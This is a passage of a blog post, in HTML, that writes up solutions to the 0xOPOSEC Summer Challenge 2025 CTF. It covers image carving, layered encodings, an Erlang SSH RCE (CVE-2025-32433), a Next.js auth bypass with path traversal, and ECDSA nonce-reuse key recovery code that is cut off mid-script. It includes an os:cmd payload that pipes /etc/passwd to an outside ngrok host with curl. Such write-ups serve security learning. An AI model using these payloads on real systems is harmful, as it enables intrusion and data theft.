@@ -1,0 +1,1188 @@
+<!DOCTYPE html>
+<html lang="en"
+  x-data
+  :class="$store.darkMode.class()"
+  :data-theme="$store.darkMode.theme()">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>0xOPOSEC Summer Challenge 2025 | Bruno Blog</title>
+
+    
+  
+    <link href="/favicon.ico" rel="icon" type="image/x-icon" />
+  
+
+
+<link rel="canonical" href="http://localhost:1313/posts/2025-10-01-0xoposec/" />
+
+
+
+<meta name="author" content="" />
+<meta name="description" content="&ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.&rdquo;
+Misc A Delicious Mess I downloaded the image and decided to throw it into binwalk to see if it had anything hidden. Good call, because binwalk revealed there was another image tucked inside the original one.
+" />
+
+
+<meta name="keywords" content="CTF">
+
+
+
+<meta name="generator" content="Hugo 0.147.0">
+
+
+<meta property="og:url" content="http://localhost:1313/posts/2025-10-01-0xoposec/">
+  <meta property="og:site_name" content="Bruno Blog">
+  <meta property="og:title" content="0xOPOSEC Summer Challenge 2025">
+  <meta property="og:description" content="“Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.”
+Misc A Delicious Mess I downloaded the image and decided to throw it into binwalk to see if it had anything hidden. Good call, because binwalk revealed there was another image tucked inside the original one.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-10-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-10-01T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="0xOPOSEC Summer Challenge 2025">
+  <meta name="twitter:description" content="“Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.”
+Misc A Delicious Mess I downloaded the image and decided to throw it into binwalk to see if it had anything hidden. Good call, because binwalk revealed there was another image tucked inside the original one.">
+
+
+
+
+<link rel="stylesheet" href="/css/output.css" />
+
+
+
+
+    
+
+
+<style>
+  pre {
+    padding: 1em;
+    overflow: auto;
+  }
+</style>
+
+
+
+
+
+
+
+
+
+    
+
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3/dist/cdn.min.js" integrity="sha256-4EHxtjnR5rL8JzbY12OKQJr81ESm7JBEb49ORPo29AY=" crossorigin="anonymous"></script>
+  </head>
+
+  <body x-data="{
+    flip: false,
+  }">
+    
+    <div id="dream-global-bg"></div>
+
+    
+<nav x-data="{ isSticky: false }"
+  x-init="window.addEventListener('scroll', () => { isSticky = window.scrollY > 30 })"
+  class="sticky top-0 z-30 mt-4 lg:mt-8 py-4"
+  :class="{ 'bg-base-100 shadow-lg dark:border-b dark:border-base-content/30': isSticky }">
+
+  
+  <div class="container flex justify-between max-w-[65ch] mx-auto px-4 md:px-0">
+  
+    <section class="flex items-center gap-4">
+      <div class="avatar cursor-pointer hover:avatar-online" @click="flip = !flip" title="Flip it!">
+        <div class="h-10 rounded-full">
+          <img src="/favicon.ico" alt="Bruno Blog" />
+        </div>
+      </div>
+
+      
+      <div>
+        
+        <a href="http://localhost:1313/" class="text-lg font-semibold cursor-pointer">
+          Bruno Blog
+        </a>
+        
+        
+      </div>
+      
+    </section>
+
+    
+    
+
+    <div class="dropdown dropdown-end sm:hidden">
+      <div tabindex="0" role="button" class="btn btn-ghost btn-square" aria-label="Select an option">
+        <ion-icon name="menu" class="text-2xl"></ion-icon>
+      </div>
+      <ul tabindex="0" class="dropdown-content menu w-36 bg-base-100 rounded-box z-1 shadow-md">
+        
+
+
+
+
+
+
+
+<li>
+  <div role="link" tabindex="0" class="inline-flex items-center p-2 cursor-pointer" @click="flip = !flip" title="About">
+    <ion-icon name="information-circle"></ion-icon>About</div>
+</li>
+
+
+
+
+
+
+
+<li>
+  <a class="group inline-flex items-center p-2 cursor-pointer" href="/search" title="Search">
+    <ion-icon name="search"></ion-icon>
+    Search
+  </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a class="inline-flex items-center p-2 cursor-pointer" href="/posts" title="Archives">
+    <ion-icon name="archive"></ion-icon>
+    Archives
+  </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a class="inline-flex items-center p-2 cursor-pointer" href="/tags" title="All Tags">
+    <ion-icon name="pricetags"></ion-icon>
+    All Tags
+  </a>
+</li>
+
+
+
+
+
+
+      </ul>
+    </div>
+    <section class="hidden sm:flex sm:items-center sm:gap-2 md:gap-4">
+      
+
+      
+      
+
+
+
+
+<div role="link" tabindex="0" class="text-sm font-semibold cursor-pointer hover:underline" @click="flip = !flip" title="About">About</div>
+
+
+
+
+
+      
+      
+<a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/search" title="Search">
+  <ion-icon class="group-hover:text-primary-content" name="search"></ion-icon>
+</a>
+
+
+      
+      
+
+
+
+
+
+      
+      
+<a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/posts" title="Archives">
+  <ion-icon class="group-hover:text-primary-content" name="archive"></ion-icon>
+</a>
+
+
+      
+      
+
+
+
+
+
+      
+      
+<a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/tags" title="All Tags">
+  <ion-icon class="group-hover:text-primary-content" name="pricetags"></ion-icon>
+</a>
+
+
+      
+
+      
+
+      
+    </section>
+  </div>
+</nav>
+
+
+    <div class="flip-container" :class="{ 'flip-it': flip }">
+      <div class="flipper">
+        <div class="front">
+          <div class="container">
+            
+<div class="lg:grid lg:grid-cols-4 gap-4 mt-4 px-4">
+  <div class="hidden lg:block">
+    
+  </div>
+
+  <div class="lg:col-span-2">
+    <article class="mx-auto prose prose-quoteless dark:prose-invert" id="dream-single-post-main" itemscope itemtype="http://schema.org/Article">
+      
+  <meta itemprop="name" content="0xOPOSEC Summer Challenge 2025">
+  <meta itemprop="description" content="“Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.”
+Misc A Delicious Mess I downloaded the image and decided to throw it into binwalk to see if it had anything hidden. Good call, because binwalk revealed there was another image tucked inside the original one.">
+  <meta itemprop="datePublished" content="2025-10-01T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-10-01T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2325">
+  <meta itemprop="keywords" content="CTF">
+
+      <header>
+        <h1 itemprop="headline">0xOPOSEC Summer Challenge 2025</h1>
+        <p class="text-sm">
+          
+            Wednesday, Oct 1, 2025
+          
+
+          | <span>11 minute read</span>
+
+          
+          | <span>Updated at
+            
+              Wednesday, Oct 1, 2025
+            </span>
+          
+        </p>
+
+        
+        <div class="flex justify-between">
+          
+
+          <div class="flex items-center gap-2">
+  
+  
+
+  
+  
+  
+  
+  
+    <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+      href="https://x.com/intent/post?text=0xOPOSEC%20Summer%20Challenge%202025&amp;url=http://localhost:1313/posts/2025-10-01-0xoposec/" target="_blank" rel="noopener noreferrer"
+      title="Share on X">
+      <ion-icon class="group-hover:text-primary-content" name="logo-x"></ion-icon>
+    </a>
+  
+    <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+      href="https://facebook.com/sharer/sharer.php?u=http://localhost:1313/posts/2025-10-01-0xoposec/" target="_blank" rel="noopener noreferrer"
+      title="Share on Facebook">
+      <ion-icon class="group-hover:text-primary-content" name="logo-facebook"></ion-icon>
+    </a>
+  
+    <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+      href="https://wa.me/?text=0xOPOSEC%20Summer%20Challenge%202025%20http://localhost:1313/posts/2025-10-01-0xoposec/" target="_blank" rel="noopener noreferrer"
+      title="Share on WhatsApp">
+      <ion-icon class="group-hover:text-primary-content" name="logo-whatsapp"></ion-icon>
+    </a>
+  
+
+  
+  
+</div>
+
+        </div>
+      </header>
+
+      <section id="dream-single-post-content" itemprop="articleBody">
+        
+
+        <p>&ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.&rdquo;</p>
+<h2 id="misc">Misc</h2>
+<h3 id="a-delicious-mess">A Delicious Mess</h3>
+<figure class="post-image"><img src="/oposec_2025/delicious.png">
+</figure>
+
+<p>I downloaded the image and decided to throw it into binwalk to see if it had anything hidden. Good call, because binwalk revealed there was another image tucked inside the original one.</p>
+<figure class="post-image"><img src="/oposec_2025/delicious2.png">
+</figure>
+
+<p>The file name was <code>12s.jpg</code>, which felt like a clue. I figured it probably meant I needed to extract it 12 times. After repeating the process 12 times, the flag finally popped out.</p>
+<figure class="post-image"><img src="/oposec_2025/delicious3.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>are_u_full_y3t?<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="matryoshka">Matryoshka</h3>
+<figure class="post-image"><img src="/oposec_2025/matry.png">
+</figure>
+
+<p>The challenge gave us an URL, which redirected to a webserver spitting out a sequence of hex values.</p>
+<figure class="post-image"><img src="/oposec_2025/matry2.png">
+</figure>
+
+<p>I tossed it into cyberchef and ran the magic recipe. With <code>from_hex('space').gunzip()</code>, the output looked like <code>brainfuck</code> code.</p>
+<figure class="post-image"><img src="/oposec_2025/matry3.png">
+</figure>
+
+<p>Using that same recipe, I confirmed it was indeed Brainfuck. I saved the output and ran it through an online brainfuck interpreter, which gave me the next layer.</p>
+<figure class="post-image"><img src="/oposec_2025/matry4.png">
+</figure>
+
+<figure class="post-image"><img src="/oposec_2025/matry5.png">
+</figure>
+
+<p>After a bit of googling, I realized it was <code>obfuscated JavaScript</code>. I ran it through an online JS interpreter and got yet another doll.</p>
+<figure class="post-image"><img src="/oposec_2025/matry6.png">
+</figure>
+
+<p>This time it was <code>uuencoded</code>, so I threw it into an online decoder—and that finally revealed the flag.</p>
+<figure class="post-image"><img src="/oposec_2025/matry7.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>Babushka!<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="foreplay">Foreplay</h3>
+<figure class="post-image"><img src="/oposec_2025/foreplay.png">
+</figure>
+
+<p>I ran an nmap against the target range and found port 2222 open:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nmap -Pn -p1024-6667 madlabs.pw -v
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>2222/tcp open  EtherNetIP-1
+</span></span></code></pre></div><p>I then connected with netcat to see what it would do. After a while, I got this back:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nc 20.4.227.104 <span style="color:#ae81ff">2222</span>
+</span></span><span style="display:flex;"><span>asd
+</span></span><span style="display:flex;"><span>SSH-2.0-Erlang/5.1.4.7
+</span></span><span style="display:flex;"><span>Protocol mismatch.
+</span></span></code></pre></div><p>I googled Erlang with the specific version and found <a href="https://www.keysight.com/blogs/en/tech/nwvs/2025/05/23/cve-2025-32433-erlang-otp-ssh-server-rce" target="_blank">CVE-2025-32433</a>
+ that contained a simple PoC to abuse this CVE.</p>
+<p>Tweaking the payload showed I could call <code>os:cmd</code> — so instead of <code>file:write</code> (original PoC) I tried to use <code>os:cmd</code> while listening with <code>nc -lvnp 8281</code> + ngrok:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>os:cmd<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cat /etc/passwd | curl -X POST --data-binary @- http://ngrok:8281&#34;</span><span style="color:#f92672">)</span>.
+</span></span></code></pre></div><figure class="post-image"><img src="/oposec_2025/foreplay2.png">
+</figure>
+
+<p>I validated that <code>os:cmd</code> worked, so I went hunting for the flag in <code>/root</code>.</p>
+<figure class="post-image"><img src="/oposec_2025/foreplay3.png">
+</figure>
+
+<figure class="post-image"><img src="/oposec_2025/foreplay4.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>OhBoyErlang<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="web">Web</h2>
+<h3 id="the-crew">The Crew</h3>
+<figure class="post-image"><img src="/oposec_2025/crew.png">
+</figure>
+
+<p>I opened the site from the challenge and got presented with what looked like <code>the crew</code>.</p>
+<figure class="post-image"><img src="/oposec_2025/crew2.png">
+</figure>
+
+<p>While poking around with Burp, I immediately spotted a <code>/flag</code> directory — but visiting it showed an admin-only restriction.</p>
+<figure class="post-image"><img src="/oposec_2025/crew3.png">
+</figure>
+
+<figure class="post-image"><img src="/oposec_2025/crew4.png">
+</figure>
+
+<p>Looking in more detail into Burp, I found a <code>/get_users</code> endpoint that returned a JSON list of users and their passwords.</p>
+<figure class="post-image"><img src="/oposec_2025/crew5.png">
+</figure>
+
+<p>I threw the password list at crackstation and only one matched.</p>
+<figure class="post-image"><img src="/oposec_2025/crew6.png">
+</figure>
+
+<p>Using that password to log into the admin panel gave me the flag.</p>
+<figure class="post-image"><img src="/oposec_2025/crew7.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>why_is_p1zz1_round?<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="you-are-not-the-admin">You Are Not the Admin</h3>
+<figure class="post-image"><img src="/oposec_2025/admin.png">
+</figure>
+
+<p>Looking at the web page I could easily identify that this was using Next.js</p>
+<figure class="post-image"><img src="/oposec_2025/admin2.png">
+</figure>
+
+<figure class="post-image"><img src="/oposec_2025/admin3.png">
+</figure>
+
+<p>I clicked <code>Go to protected area</code>, which routed me to <code>/admin</code> and immediately redirected to <code>/login</code>.</p>
+<figure class="post-image"><img src="/oposec_2025/admin4.png">
+</figure>
+
+<figure class="post-image"><img src="/oposec_2025/admin5.png">
+</figure>
+
+<p>I searched for &ldquo;Next.js auth bypass&rdquo; and landed on a <a href="https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/" target="_blank">Datadog writeup</a>
+ that looked relevant - one section there jumped out as especially useful:</p>
+<figure class="post-image"><img src="/oposec_2025/admin6.png">
+</figure>
+
+<p>So the blog post talks about an api and while checking console logs I noticed that there&rsquo;s an api present.</p>
+<figure class="post-image"><img src="/oposec_2025/admin7.png">
+</figure>
+
+<p>Using the PoC available in the blog it&rsquo;s clear that it&rsquo;s possible to bypass the auth mechanism in the login form moving directly into the admin area.</p>
+<figure class="post-image"><img src="/oposec_2025/admin8.png">
+</figure>
+
+<figure class="post-image"><img src="/oposec_2025/admin9.png">
+</figure>
+
+<p>Once inside the admin area, the only section that actually did anything was &ldquo;Settings&rdquo; — it took me to a page that let me read files directly from the server.</p>
+<figure class="post-image"><img src="/oposec_2025/admin10.png">
+</figure>
+
+<p>Going for the low-hanging fruit, I tried an LFI attack to grab the flag and ended up with this:</p>
+<figure class="post-image"><img src="/oposec_2025/admin11.png">
+</figure>
+
+<p>After a few failed attempts, I switched to a path traversal attack and successfully grabbed <code>/etc/passwd</code>:</p>
+<figure class="post-image"><img src="/oposec_2025/admin12.png">
+</figure>
+
+<p>After a bit, I realized there were no users besides <code>root*</code> — with this in mind I checked <code>/etc/shadow</code> and that&rsquo;s where the flag was.</p>
+<figure class="post-image"><img src="/oposec_2025/admin13.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>y0u_d1scov3red_the_P4TH<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="take-a-look-in-the-mirror-">Take a Look in the Mirror !</h3>
+<figure class="post-image"><img src="/oposec_2025/mirror.png">
+</figure>
+
+<p>Exploring the provided URL, I stumbled upon a <code>/debug</code> directory that contained what looked like a Java stack trace, including some custom classes.</p>
+<figure class="post-image"><img src="/oposec_2025/mirror2.png">
+</figure>
+
+<p>After some Slack hints pointing to Java reflection (Java reflection allows a program to inspect and manipulate classes, methods, and objects at runtime, even if they weren’t known at compile time) - which fit the challenge name - I realized I could invoke methods directly via the URL by specifying the className.</p>
+<figure class="post-image"><img src="/oposec_2025/mirror3.png">
+</figure>
+
+<p>Looking back at the first 500 error in the <code>/debug</code> directory, I noticed a comment:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Exception in controller java.lang: Class c <span style="color:#f92672">=</span> Class.forName<span style="color:#f92672">(</span>className<span style="color:#f92672">)</span>; // NormalUser
+</span></span></code></pre></div><p>After some testing, I tried calling<code>http://madlabs.pw:8081/debug?className=com.opolabs.mirror.NormalUser</code> and got the following response:</p>
+<figure class="post-image"><img src="/oposec_2025/mirror4.png">
+</figure>
+
+<p>With that in mind, I figured I might be able to call the same class for the administrator. After trying a few guesses, I found that <code>AdminUser</code> was the correct one.</p>
+<figure class="post-image"><img src="/oposec_2025/mirror5.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>JavaReflectionForTheWin!<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="crypto">Crypto</h2>
+<h3 id="sounds-frm-another-planet">Sounds Frm Another Planet</h3>
+<figure class="post-image"><img src="/oposec_2025/sounds.png">
+</figure>
+
+<p>After grabbing the encrypted message file, its content contained only the letters <code>u</code>, <code>s</code>, <code>d</code>, and <code>p</code>.</p>
+<figure class="post-image"><img src="/oposec_2025/sounds2.png">
+</figure>
+
+<p>At first, I thought it was a simple substitution cipher, but I wasn&rsquo;t getting anywhere.</p>
+<p>After a few dead ends, I checked out <a href="https://dcode.fr/tools-list" target="_blank">https://dcode.fr/tools-list</a>
+, which has a handy tool that can help identify the type of cipher.</p>
+<figure class="post-image"><img src="/oposec_2025/sounds3.png">
+</figure>
+
+<p>I pasted the encrypted text into the tool, clicked analyze, and it suggested that the text is written in Deadfish.</p>
+<figure class="post-image"><img src="/oposec_2025/sounds4.png">
+</figure>
+
+<p>That’s where I learned that Deadfish isn&rsquo;t really a cipher - it&rsquo;s an extremely simplified programming language with just a single memory cell and four basic operations.</p>
+<figure class="post-image"><img src="/oposec_2025/sounds5.png">
+</figure>
+
+<p>By default, Deadfish only uses four letters: <code>i</code>, <code>s</code>, <code>d</code>, and <code>o</code>. But the provided message had <code>u</code>, <code>d</code>, <code>s</code>, and <code>p</code>, so I had to tweak it a bit.</p>
+<p>To convert it into the standard Deadfish format, I applied the following transformations:</p>
+<ul>
+<li><code>u</code> ➡️ <code>i</code></li>
+<li><code>d</code> ➡️ <code>d</code></li>
+<li><code>s</code> ➡️ <code>s</code></li>
+<li><code>p</code> ➡️ <code>o</code></li>
+</ul>
+<figure class="post-image"><img src="/oposec_2025/sounds6.png">
+</figure>
+
+<p>With the transformations applied, I pasted the result into the tool, decrypted it, and got the flag.</p>
+<figure class="post-image"><img src="/oposec_2025/sounds7.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>my_n4m3_15_d3adf1sh<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="2010">2010</h3>
+<figure class="post-image"><img src="/oposec_2025/date.png">
+</figure>
+
+<p>Navigating to the provided URL, I landed on a page that said the flag would only be given to administrators.</p>
+<figure class="post-image"><img src="/oposec_2025/date2.png">
+</figure>
+
+<p>While inspecting the traffic in Burp Suite, I noticed a JWT.</p>
+<figure class="post-image"><img src="/oposec_2025/date3.png">
+</figure>
+
+<p>A simple Base64 decode showed that the JWT was a JSON object with two entries: &ldquo;data&rdquo; and &ldquo;signature&rdquo;. Inside &ldquo;data&rdquo;, there were two fields: &ldquo;name&rdquo; and &ldquo;admin&rdquo;.</p>
+<figure class="post-image"><img src="/oposec_2025/date4.png">
+</figure>
+
+<p>I tried changing &ldquo;admin&rdquo; from false to true, but that didn’t grant me admin rights. Another thing I noticed was that every time I pressed F5, the &ldquo;name&rdquo; in the JSON object changed, and it updated in the UI as well.</p>
+<figure class="post-image"><img src="/oposec_2025/date5.png">
+</figure>
+
+<p>Seeing the challenge name, I suspected this might be an old crypto attack from around 2010. A quick search led me to this: <a href="https://github.com/elikaski/ECC_Attacks" target="_blank">https://github.com/elikaski/ECC_Attacks</a>
+.</p>
+<figure class="post-image"><img src="/oposec_2025/date6.png">
+</figure>
+
+<p>Reading through the GitHub repository, it seems that in 2010 Sony reused the same value of <code>k</code> in different ECDSA signatures for the PlayStation, leading to a vulnerability.</p>
+<p>The formula to recover the private key when the same k is reused is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># k = ((m1 - m2) * modinv(s1 - s2, q)) % q</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>from Crypto.Util.number import inverse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># NIST P-256 (ECDSA)</span>
+</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>m1 <span style="color:#f92672">=</span> token1<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;message_hash&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>m2 <span style="color:#f92672">=</span> token2<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;message_hash&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>s1 <span style="color:#f92672">=</span> token1<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;s&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>s2 <span style="color:#f92672">=</span> token2<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;s&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> token1<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># k</span>
+</span></span><span style="display:flex;"><span>numerator <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>m1 - m2<span style="color:#f92672">)</span> % q
+</span></span><span style="display:flex;"><span>denominator <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>s1 - s2<span style="color:#f92672">)</span> % q
+</span></span><span style="display:flex;"><span>den_inv <span style="color:#f92672">=</span> inverse<span style="color:#f92672">(</span>denominator, q<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>k <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>numerator * den_inv<span style="color:#f92672">)</span> % q
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>k -&gt; <span style="color:#ae81ff">115792089210356248762697446949407573529996955224135760342422259061068512044368</span>
+</span></span></code></pre></div><p>With some ChatGPT help I got the following resume about this vulnerability:</p>
+<figure class="post-image"><img src="/oposec_2025/date7.png">
+</figure>
+
+<p>To solve this, I grabbed two JSON objects with signatures, which allowed me to extract the reused nonce <code>k</code> and ultimately recover the private key, assigning it to the variable <code>x</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> sha256
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> inverse, bytes_to_long
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># NIST P-256 order</span>
+</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Provided JWTs (Base64-encoded)</span>
+</span></span><span style="display:flex;"><span>jwt1_b64 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;eyJkYXRhIjogIntcIm5hbWVcIjogXCJHYXJjaWFcIiwgXCJhZG1pblwiOiBmYWxzZX0iLCAic2lnbmF0dXJlIjogIjZiMTdkMWYyZTEyYzQyNDdmOGJjZTZlNTYzYTQ0MGYyNzcwMzdkODEyZGViMzNhMGY0YTEzOTQ1ZDg5OGMyOTZlMjg1OWViMjFiYWZmZmI5NWRlYjMyMDI3ODE0ODIxZTc3N2FmYzM1YjgxNjJkYmQ5Y2FjYTczNDlmNDcwNzk0In0=&#34;</span>
+</span></span><span style="display:flex;"><span>jwt2_b64 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;eyJkYXRhIjogIntcIm5hbWVcIjogXCJHdWVycmVyb1wiLCBcImFkbWluXCI6IGZhbHNlfSIsICJzaWduYXR1cmUiOiAiNmIxN2QxZjJlMTJjNDI0N2Y4YmNlNmU1NjNhNDQwZjI3NzAzN2Q4MTJkZWIzM2EwZjRhMTM5NDVkODk4YzI5NmFkNDc5NDg0Yjk2NDFjNGEzMGY3MTM4NWM5ZDM2NDc2NWRlNzFiMjMwZTVmMDEyNDAwODkwZGUwM2U1OTdmZDAifQ==&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decode Base64 and parse JSON</span>
+</span></span><span style="display:flex;"><span>jwt1 <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(base64<span style="color:#f92672">.</span>b64decode(jwt1_b64))
+</span></span><span style="display:flex;"><span>jwt2 <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(base64<span style="color:#f92672">.</span>b64decode(jwt2_b64))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Function to convert signature hex to r and s</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sig_to_rs</span>(sig_hex):
+</span></span><span style="display:flex;"><span>    sig_bytes <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(sig_hex)
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> bytes_to_long(sig_bytes[:<span style="color:#ae81ff">32</span>])
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> bytes_to_long(sig_bytes[<span style="color:#ae81ff">32</span>:])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r, s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r1, s1 <span style="color:#f92672">=</span> sig_to_rs(jwt1[<span style="color:#e6db74">&#34;signature&#34;</span>])
+</span></span><span style="display:flex;"><span>r2, s2 <span style="color:#f92672">=</span> sig_to_rs(jwt2[<span style="color:#e6db74">&#34;signature&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hash the &#34;data&#34; fields using SHA-256</span>
+</span></span><span style="display:flex;"><span>m1 <span style="color:#f92672">=</span> int(sha256(jwt1[<span style="color:#e6db74">&#34;data&#34;</span>]<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>)
